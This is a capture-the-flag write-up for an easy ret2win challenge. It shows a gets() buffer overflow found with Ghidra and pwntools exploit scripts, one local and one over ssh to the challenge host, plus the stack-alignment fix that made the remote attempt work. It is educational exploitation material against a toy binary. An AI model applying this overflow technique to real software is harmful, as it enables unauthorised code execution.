## Summary

This _is_ a stupid _easy_ _ret2win_ that worked locally, but not remotely (via ssh).  After reading a writeup, I was just _off by one_.  Kinda pissed.

Hat tip again to [po6ix](https://gist.github.com/po6ix/) for their [writeup](https://gist.github.com/po6ix/31a1ed1b033b1ab23541c84e83de448d#file-ez-ret-to-win-py)

The key is here from po6ix:

```
# payload += p64(0x400917)
payload += p64(0x400918)
```

+1.  Goddamnit.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The title indicate this is _ret2win_, so assume we just need to BOF and _ret2win_.


### Decompile with Ghidra

```c
  if (__fd == 0) {
    printf("Enter Your password to continue: ");
    gets(local_a8);
    printf("you typed \'%s\', Good Bye!\n",local_a8);
```

From `main` above, `gets` is the vulnerability.  And the buffer is `0xa8` bytes from the return address.

```c
undefined8 rasengan(void)
{
  int iVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    perror("flag.txt not found! If this happened in the server contact the author please!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    iVar1 = fgetc(__stream);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  fclose(__stream);
  return 0;
}
```    

Here is our `win` function.  Easy, right?


## Exploit

### Local Test

```
#!/usr/bin/env python

from pwn import *

binary = context.binary = ELF('./superez')
context.log_level = 'DEBUG'
context.log_file = 'foo.log'

p = process(binary.path, stdin=PTY, raw=True)
p.recvuntil('Enter Your password to continue:')
payload  = 0xa8 * b'A'
payload += p64(binary.sym.rasengan)
p.sendline(payload)
p.interactive()
```

This worked perfectly.


### Remote Test

```
#!/usr/bin/env python

from pwn import *

binary = context.binary = ELF('./superez')
context.log_level = 'INFO'
context.log_file = 'log.log'

s = ssh(host='superez.fword.wtf',user='ctf',port=2222,password='FwOrDAndKahl4FTW')
p = s.run('/bin/bash')
p.recvuntil('/home/user1$')
p.sendline('./task')

p.recvuntil('Enter Your password to continue:')
payload  = 0xa8 * b'A'
payload += p64(binary.sym.rasengan)
p.sendline(payload)
p.interactive()
```

This did _NOT_ work.  I wasted all my time thinking it was something with ssh and some of the `termios` shitfuckery in `main`.

In hindsight I should have just checked out the libc version on the remote server, or just blindly tested:

`payload += p64(binary.sym.rasengan + 1)`

`+ 1`, there it is again.  I know better.  I should have known [stack alignment](https://blog.binpang.me/2019/07/12/stack-alignment/) could be a potential issue and testing with +1 could have been a lazy check.  Jesus, I already dealt with this twice in this CTF.

Fuck me.
